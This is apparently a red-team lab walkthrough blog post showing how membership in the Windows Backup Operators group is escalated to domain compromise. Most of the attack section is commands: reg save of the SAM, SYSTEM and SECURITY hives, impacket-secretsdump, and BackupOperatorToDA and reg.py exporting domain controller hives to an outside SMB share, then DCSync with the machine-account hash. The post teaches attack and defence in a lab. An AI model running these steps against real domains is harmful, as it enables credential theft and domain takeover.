---
title: "Domain Privilege Escalation Backup Operators Group"
date: 2024-02-12 00:00:00 +0000
categories: 
  - Domain Privilege Escalation
  - Active Directory
  - RedTeam
---

# Windows Built-in Groups 

Windows Built-in Groups are predefined groups that come preconfigured with Windows operating systems. These groups serve specific purposes and are used for managing permissions, access, and security within the Windows environment. Some common built-in groups include:

1. Administrators: Members of this group have full control over the computer. They can perform administrative tasks, install software, modify system settings, and manage other users and groups.
2. Users: Regular users who have limited privileges on the system. They can use most software and change system settings that do not affect other users or the security of the computer.
3. Guests: Limited access accounts for users who require temporary or occasional access to the system. Guest accounts typically have very restricted permissions.
4. Backup Operators: As mentioned earlier, members of this group can perform backup and restore operations on the system, including backing up and restoring files and directories.
5. Power Users: A legacy group in older versions of Windows, members of this group had more privileges than regular users but fewer than administrators. This group is deprecated in newer versions of Windows.
6. Remote Desktop Users: Members of this group are allowed to log in to the system remotely using Remote Desktop Protocol (RDP).
7. Network Configuration Operators: Members of this group have permissions to perform network configuration tasks on the computer, such as modifying network settings and installing network drivers.
These built-in groups provide a convenient way to manage access and permissions on Windows systems, allowing administrators to assign appropriate rights to users and groups based on their roles and responsibilities.
## Backup Operators
The Backup Operators group is a built-in group in Microsoft Windows operating systems. This group is designed to grant users limited privileges to perform backup and restore operations on the system, including the ability to back up and restore files and directories, regardless of their permissions. Members of the Backup Operators group can perform tasks such as backing up the entire system, backing up files and directories, and restoring files and directories. This group is useful in environments where individuals need to perform backup and restore tasks without having full administrative privileges on the system.

### Lab Configuration 
#### Setting Up Privilege on Domain Controller


[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-1.png)](https://r00tven0m.github.io/)

Let’s configure the lab on the server to apply theory and escalated windows server privileges. Go to server manager dashboard then click on “**Tools**” then select “**Active Directory Users and Computers**

We are going to add a user Serena.Alla to the active directory security group for the demonstration. To do that, go to **“users**” select “**Serena.Alla**” and click on “**properties**”.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-2.png)](https://r00tven0m.github.io/)

That will open a new window where we need to click on the “ **member of** “ tab and then click on the “**add**” button to add user to any specific group.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-3.png)](https://r00tven0m.github.io/)
A new window will open where we need to select object types as “**Groups or Built-in security principals**” and select location to domain name which is “**cbank. local**” here. Then, we need to enter object name which is the group to that we wish to add user to. In this case, we are using the **Backup Operators’** group then click ok.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-4.png)](https://r00tven0m.github.io/)


We can verify whether a user is added to the backups operators’ group by simply clicking on the **members of** tab. We can see that we have successfully added user Serena.Alla to backups operators’ group.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-5.png)](https://r00tven0m.github.io/)



## Enumeration With PowerView.ps1

#### Enumerating AD Users

```powershell
Get-DomainUser -Identity Serena.Alla -Domain cbank.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,acco
```
[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-6.png)](https://r00tven0m.github.io/)
#### Enumerating AD Groups

```powershell
Get-DomainGroupMember -Identity 'Backup Operators'
OR 
Get-DomainGroupMember -Identity 'Backup Operators' | select GroupName,MemberName,MemberDomain,GroupDistinguishedName
```


[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-7.png)](https://r00tven0m.github.io/)
#### Backing up SAM and SYSTEM,security Registry Hives

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```powershell
reg save hklm\sam c:\Temp\sam.sav
reg save hklm\system C:\Users\serena.alla\Documents\system.sav
reg save hklm\security C:\Users\serena.alla\Documents\security.sav
```

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-8.png)](https://r00tven0m.github.io/)

### secretsdump.py 

```bash
impacket-secretsdump LOCAL -system system.sav -sam sam.sav
```

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-9.png)](https://r00tven0m.github.io/)

but we get hashes local users we need get all hash DC

#### Attacking a Domain Controller  with [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

The [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) is a proof of concept written in C++ which can target domain controllers using an account which is part of the Backup Operators group. The proof of concept can export the registry hives into C:\temp_ path or into a UNC share.

```powershell
net use G: \\192.168.56.1\test /u:test test
.\BackupOperatorToDA-x64.exe -t \\dc01.cbank.local -o G:\\
```
[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-11.png)](https://r00tven0m.github.io/)

#### Aonther Way Attacking a Domain Controller  with  [reg.py](https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py "reg.py")


```bash
python3 reg.py Serena.Alla:'Password123'@192.168.56.100 backup -p '\\192.168.56.1\test'
```

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-12.png)](https://r00tven0m.github.io/)

```bash
impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
```

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-13.png)](https://r00tven0m.github.io/)

Nice We Can get hash MACHINE ACCOUNT `DC01$` 
Now the NTLM hash for the Domain Controller has been extracted.
Now we will provide the NT hash to the secretsdump tool along with the name of the Domain Controller to extract all users present in the Active Directory environment with their respective hashes via a file. The machine account credentials could then be used to DCSync domain credentials.

```bash
impacket-secretsdump cbank.local/'dc01$'@dc01.cbank.local -hashes :c8d2d1f95b533d6326baf3cccdb81d10
```

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-14.png)](https://r00tven0m.github.io/)

# In Conclusion

Backup Operators is a privileged group, and should be monitored and protected in a similar manner to Enterprise/Domain administrator groups.

`We have reached the end of the article.`
